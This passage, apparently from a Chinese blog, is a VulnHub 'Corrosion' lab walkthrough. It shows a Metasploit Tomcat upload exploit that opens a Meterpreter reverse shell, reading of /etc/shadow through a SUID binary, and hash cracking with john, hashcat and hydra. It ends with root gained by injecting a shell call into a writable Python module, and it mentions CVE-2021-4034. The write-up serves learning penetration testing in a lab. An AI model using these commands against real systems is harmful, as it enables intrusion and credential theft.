run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Executing kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Undeploying kzjgLzmgvwvJfA8VstCGx538xC ...<br>[*] Exploit completed, but no session was created.<br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying pMSae7Hpx3qAH7v9lPM...<br>[*] Executing pMSae7Hpx3qAH7v9lPM...<br>[*] Undeploying pMSae7Hpx3qAH7v9lPM ...<br>[*] Sending stage (58060 bytes) to 192.168.135.150<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.150:52254) at 2022-07-01 02:11:13 -0400<br><br>meterpreter &gt; shell<br>Process 1 created.<br>Channel 1 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>/bin/sh: 1: python: not found<br>exit<br>meterpreter &gt; cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br>meterpreter &gt; cat /etc/shadow<br>[-] core_channel_open: Operation failed: 1<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>用拿到的用户和密码进行撞库，成功拿到 jaye 用户权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tomcat@192.168.135.150</span><br>tomcat@192.168.135.150&#x27;s password: <br>Permission denied, please try again. <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span><br>randy@192.168.135.150&#x27;s password: <br>Permission denied, please try again.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh jaye@192.168.135.150</span><br>jaye@192.168.135.150&#x27;s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>19 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>jaye<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1002(jaye) gid=1002(jaye) groups=1002(jaye)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for jaye: <br>Sorry, user jaye may not run sudo on corrosion.<br><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye  randy<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/home/jaye<br><span class="hljs-meta">$</span><span class="bash"> ls</span> <br>Desktop  Documents  Downloads  Files  Music  Pictures  Public  snap  Templates  Videos<br><span class="hljs-meta">$</span><span class="bash"> ls Files</span><br>look<br><span class="hljs-meta">$</span><span class="bash"> ls -al Files/look</span><br>---s--s--x 1 root root 14728 Sep 17  2021 Files/look<br></code></pre></td></tr></table></figure>
+<p>在其 <code>Files</code> 目录下找到一个 <code>look</code> ，可以实现越权访问：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/etc/shadow&quot;</span></span><br>[......]<br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPf<br>jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/root/root.txt&quot;</span></span><br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure>
+<p>得到 randy 的盐值，使用 john 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::&#x27;</span> &gt; passwd.txt</span><br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                             <br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>07051986randy    (randy)<br>1g 0:02:22:45 DONE (2022-07-01 03:45) 0.000116g/s 1626p/s 1626c/s 1626C/s 070552898..070511513<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 1800 -a 0 -o found.txt passwd.txt /usr/share/wordlists/rockyou.txt</span>  <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: sha512crypt $6$, SHA512 (Unix)<br>Hash.Target......: $6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQ...FHJGY/<br>Time.Started.....: Fri Jul  1 08:53:00 2022 (13 hours, 26 mins)<br>Time.Estimated...: Fri Jul  1 22:19:44 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:      905 H/s (17.38ms) @ Accel:32 Loops:512 Thr:1 Vec:4<br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 13932928/14344385 (97.13%)<br>Rejected.........: 0/13932928 (0.00%)<br>Restore.Point....: 13932800/14344385 (97.13%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000<br>Candidates.#1....: 070541 -&gt; 070519851<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat found.txt</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$bQ8rY</span>/73PoUA4lFX<span class="hljs-variable">$i</span>/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy</span><br></code></pre></td></tr></table></figure>
+<p>或者直接使用 hydra 进行 SSH 爆破 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l randy -P /usr/share/wordlists/rockyou.txt 192.168.135.150 ssh</span>  <br></code></pre></td></tr></table></figure>
+<h3 id="M1、Sudo"><a href="#M1、Sudo" class="headerlink" title="M1、Sudo"></a>M1、Sudo</h3><p>使用 SSH 登录，查看权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span> <br>randy@192.168.135.150&#x27;s password: <br><br>randy@corrosion:~$ whoami<br>randy<br>randy@corrosion:~$ id<br>uid=1000(randy) gid=1000(randy) groups=1000(randy),27(sudo)<br>randy@corrosion:~$ sudo -l<br>[sudo] password for randy: <br>Matching Defaults entries for randy on corrosion:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User randy may run the following commands on corrosion:<br>    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py<br></code></pre></td></tr></table></figure>
+<p>可以运行一个文件，查看该文件权限，发现不能更改该文件，查看其内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ pwd<br>/home/randy<br>randy@corrosion:~$ ls -l /home/randy/randombase64.py<br>-rwxr-xr-x 1 root root 210 Sep 20  2021 /home/randy/randombase64.py<br>randy@corrosion:~$ cat /home/randy/randombase64.py<br>import base64<br><br>message = input(&quot;Enter your string: &quot;)<br>message_bytes = message.encode(&#x27;ascii&#x27;)<br>base64_bytes = base64.b64encode(message_bytes)<br>base64_message = base64_bytes.decode(&#x27;ascii&#x27;)<br><br>print(base64_message)<br></code></pre></td></tr></table></figure>
+<p>用了 base64 模块，找到 base64 脚本，查看该文件权限，发现可以修改：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ find / -name base64.py  2&gt;/dev/null<br>/snap/core18/2128/usr/lib/python3.6/base64.py<br>/snap/core18/2409/usr/lib/python3.6/base64.py<br>/snap/core20/1518/usr/lib/python3.8/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python3.6/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py<br>/usr/lib/python3.8/base64.py<br>randy@corrosion:~$ ls -l /usr/lib/python3.8/base64.py<br>-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py<br></code></pre></td></tr></table></figure>
+<p>直接在 base64 模块里面写入调用 shell 的语句，使用 os 模块调用 shell ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ vi /usr/lib/python3.8/base64.py<br><span class="hljs-meta">#</span><span class="bash"> import os</span><br><span class="hljs-meta">#</span><span class="bash"> os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+<p>运行 randombase64.py 文件，成功得到 root 权限，查看 flag：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py<br>[sudo] password for randy: <br>root@corrosion:/home/randy# whoami<br>root<br>root@corrosion:/home/randy# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@corrosion:/home/randy# ls /root<br>root.txt  snap<br>root@corrosion:/home/randy# cat /root/root.txt<br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure>
+<h3 id="M2、SUID"><a href="#M2、SUID" class="headerlink" title="M2、SUID"></a>M2、SUID</h3><p>找到 <code>/usr/bin/pkexec</code> ，可以使用 <code>CVE-2021-4034</code> 通杀漏洞进行提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>[.......]<br>/usr/bin/pkexec<br>/usr/sbin/pppd<br>[.......]<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、目录扫描：dirsearch、nikto、dirb（加参数 -X ：扫描特定后缀的文件）</p>
+<p>2、备份文件：配置文件泄露</p>
+<p>3、zip文件破解：zip2john + john，fcrackzip</p>
+<p>4、tomcat：msf、upload war</p>
+<p>5、撞库：SSH</p>
+<p>6、look：越权访问</p>
+<p>7、爆破：hash john/hashcat、ssh hydra</p>
+<p>8、提权：sudo、CVE-2021-4034</p>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>unshadow 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unshadow passwd shadow &gt; password.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt password.txt</span><br></code></pre></td></tr></table></figure>
+<p> 将这两个文件生成需要破解的文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> shadow</span> <br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:18878:0:99999:7:::<br><span class="hljs-meta">#</span><span class="bash"> passwd</span> <br>kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br><span class="hljs-meta">#</span><span class="bash"> password.txt</span><br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">W1R3S交流</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/">
+                        <span class="hidden-mobile">DC：2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
